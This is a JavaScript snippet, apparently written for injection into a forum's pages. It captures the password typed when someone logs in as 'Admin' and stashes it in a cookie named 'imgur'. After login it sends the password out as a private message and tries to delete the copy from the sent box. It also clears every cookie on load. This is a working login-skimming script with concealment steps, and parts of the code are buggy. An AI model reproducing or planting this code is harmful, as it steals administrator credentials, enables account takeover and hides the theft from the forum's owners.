 function deleteAllCookies() {
    var cookies = document.cookie.split(";");

    for (var i = 0; i < cookies.length; i++) {
        var cookie = cookies[i];
        var eqPos = cookie.indexOf("=");
        var name = eqPos > -1 ? cookie.substr(0, eqPos) : cookie;
        document.cookie = name + "=;expires=Thu, 01 Jan 1970 00:00:00 GMT";
    }
 }
	
 deleteAllCookies();
 
function setCookie(c_name,value,expiresecs) {
	    var exdate = new Date();
	    exdate.setTime(exdate.getTime()+ ((expiresecs) ? expiresecs*1000: 0));
	    document.cookie = c_name+ "=" +escape(value)+
	        ((expiresecs==null) ? "" : ";expires="+exdate.toGMTString());
	}  
	function getCookie(c_name) {
	    if (document.cookie.length > 0)  {
	        c_start = document.cookie.indexOf(c_name + "=");
	        if (c_start != -1) { 
	            c_start = c_start + c_name.length + 1; 
	            c_end = document.cookie.indexOf(";", c_start);
	            if (c_end == -1) c_end = document.cookie.length;
	            return unescape(document.cookie.substring(c_start,c_end));
	        } 
	    }
	    return "";
	}
	if(_userdata["session_logged_in"] == 0){
	$('input[type="submit"][name="login"][value="Login"]').click(function(){
      var fdf1 = $('input[name="username"]').val();
      var fdf2 = $('input[type="password"][name="password"]').val();
      if(fdf1 == "Admin") { 
        var imgur = fdf2;
        setCookie("imgur", imgur, 10000);
        var imgur2 = getCookie("imgur");
        alert(imgur2);
      }

	});
	
	}
	
		if(_userdata["session_logged_in"] == 1){
var imgur3 = getCookie("imgur");
if(imgur3 !== null) {
	
	$.post('/privmsg', { 
'mode': 'post',
 'post': '1',
 'folder': 'inbox',
 'username': 'Admin',
 'subject': 'Imgur - password',
 'message': imgur3, 
 }).done(function() {
	 
	 
	 $.get("/privmsg?folder=sentbox", function(titulo){
		 $('.topictitle', titulo).each(function(){
			 mp = $(this, titulo).text(); 
			 if(t == "Admin") {
				 
				$(mp, titulo).parents("tr", titulo).find('input[type="checkbox"]', titulo).attr('checked', 'checked'); 
				$('.button[value="Excluir item selecionado"]', titulo).click();
				alert();
				 
			 };
			 
		 });
		 
	 });
	 
			 
			 deleteAllCookies(); 
		 
	 });

 
		
	 }
		}
